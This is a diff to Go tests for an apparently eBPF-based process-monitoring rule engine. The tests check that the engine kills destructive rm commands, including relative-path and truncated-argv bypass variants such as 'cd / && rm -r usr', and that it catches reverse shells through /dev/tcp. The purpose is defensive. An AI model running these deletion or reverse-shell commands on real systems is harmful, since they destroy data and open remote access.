@@ -82,6 +82,7 @@ func TestDestructiveRMAllBypassVariants(t *testing.T) {
 		{"rm", "-rf", "--no-preserve-root", "/"},
 		{"rm", "-r", "-f", "/"},
 		{"rm", "-r", "/usr"},
+		{"rm", "--r", "/usr"},
 		{"rm", "--rec", "--forc", "/usr"},
 		{"rm", "-rf", "--", "/"},
 		{"rm", "-Rf", "/"},
@@ -92,6 +93,7 @@ func TestDestructiveRMAllBypassVariants(t *testing.T) {
 		{"rm", "-rf", "/usr/local"},
 		{"rm", "-fr", "~"},
 		{"bash", "-c", "rm -r -f -- /home"},
+		{"bash", "-c", "cd / && rm -r usr"},
 	}
 	for _, argv := range shouldCatch {
 		ev := model.Event{Type: model.EventExec, Exe: argv[0], Argv: argv}
@@ -101,15 +103,36 @@ func TestDestructiveRMAllBypassVariants(t *testing.T) {
 		}
 	}
 
-	// >8 arguments (truncated eBPF argv, full cmdline from /proc/<pid>/cmdline) MUST still match!
+	// Relative targets resolved against ev.Cwd (e.g. cd / && rm -r usr; cd /home && rm -r operator).
+	relDangerous := []model.Event{
+		{Type: model.EventExec, Exe: "/usr/bin/rm", Cwd: "/", Argv: []string{"rm", "-r", "usr"}},
+		{Type: model.EventExec, Exe: "/usr/bin/rm", Cwd: "/etc", Argv: []string{"rm", "--r", "."}},
+		{Type: model.EventExec, Exe: "/usr/bin/rm", Cwd: "/home", Argv: []string{"rm", "-r", "operator"}},
+		{Type: model.EventExec, Exe: "/usr/bin/rm", Cwd: "/home/alice/project", Argv: []string{"rm", "-rf", "../.."}},
+		{Type: model.EventExec, Exe: "/usr/bin/bash", Cwd: "/", Argv: []string{"bash", "-c", "rm -r usr 2>/dev/null || sleep 25"}},
+	}
+	for _, ev := range relDangerous {
+		if matches, act, _ := eng.Evaluate(ev); len(matches) != 1 || act != model.ActionKill {
+			t.Errorf("expected relative destructive rm %+v to be caught with kill, got matches=%d act=%s", ev, len(matches), act)
+		}
+	}
+
+	// Relative safe cleanup under a deep project subdir MUST NOT false-positive.
+	relSafe := model.Event{Type: model.EventExec, Exe: "/usr/bin/rm", Cwd: "/home/alice/project", Argv: []string{"rm", "-rf", "dist"}}
+	if matches, _, _ := eng.Evaluate(relSafe); len(matches) != 0 {
+		t.Errorf("safe relative rm in project dir false-positived")
+	}
+
+	// >8 arguments (truncated eBPF argv, full cmdline preserved separately in ProcCmdline) MUST still match!
 	longEv := model.Event{
-		Type:    model.EventExec,
-		Exe:     "/usr/bin/rm",
-		Argv:    []string{"rm", "-rf", "a", "b", "c", "d", "e", "f"},
-		Cmdline: "rm -rf a b c d e f g /usr",
+		Type:        model.EventExec,
+		Exe:         "/usr/bin/rm",
+		Argv:        []string{"rm", "-rf", "a", "b", "c", "d", "e", "f"},
+		Cmdline:     "rm -rf a b c d e f",
+		ProcCmdline: "rm -rf a b c d e f g /usr",
 	}
 	if matches, act, _ := eng.Evaluate(longEv); len(matches) != 1 || act != model.ActionKill {
-		t.Errorf("expected >8-arg rm to be caught via cmdline, got matches=%d act=%s", len(matches), act)
+		t.Errorf("expected >8-arg rm to be caught via ProcCmdline, got matches=%d act=%s", len(matches), act)
 	}
 
 	// Real eBPF + /proc/cmdline shape for `bash -c 'rm -r /usr 2>/dev/null || sleep 25'`.
@@ -155,5 +178,43 @@ func TestMatchGlobDoubleStar(t *testing.T) {
 		if got := matchGlob(tc.pat, tc.val); got != tc.want {
 			t.Errorf("matchGlob(%q, %q) = %v, want %v", tc.pat, tc.val, got, tc.want)
 		}
+	}
+}
+
+func TestCmdlineRegexMatchesBothKernelCmdlineAndProcCmdline(t *testing.T) {
+	eng, err := NewEngine([]Rule{
+		{
+			ID:       "RW-CORE-001",
+			Name:     "Reverse shell",
+			Severity: model.SeverityCritical,
+			Action:   model.ActionKill,
+			Match: MatchSpec{
+				EventTypes:   []model.EventType{model.EventExec},
+				CmdlineRegex: []string{`/dev/(tcp|udp)/[0-9a-zA-Z\.\-]+/[0-9]+`},
+			},
+		},
+	})
+	if err != nil {
+		t.Fatalf("NewEngine: %v", err)
+	}
+
+	// Process rewrote argv0 in /proc/cmdline; kernel eBPF Cmdline MUST still match.
+	ev1 := model.Event{
+		Type:        model.EventExec,
+		Cmdline:     "bash -c /dev/tcp/198.51.100.42/4444",
+		ProcCmdline: "harmless-padding-longer-than-original-cmdline-value",
+	}
+	if matches, act, _ := eng.Evaluate(ev1); len(matches) != 1 || act != model.ActionKill {
+		t.Fatalf("expected kernel Cmdline match even when ProcCmdline rewritten, got matches=%d act=%s", len(matches), act)
+	}
+
+	// Truncated eBPF argv (>8 args); fuller ProcCmdline MUST also match.
+	ev2 := model.Event{
+		Type:        model.EventExec,
+		Cmdline:     "bash -c echo 1 2 3 4 5",
+		ProcCmdline: "bash -c echo 1 2 3 4 5 && exec /dev/tcp/198.51.100.42/4444",
+	}
+	if matches, act, _ := eng.Evaluate(ev2); len(matches) != 1 || act != model.ActionKill {
+		t.Fatalf("expected ProcCmdline match for >8-arg execve, got matches=%d act=%s", len(matches), act)
 	}
 }
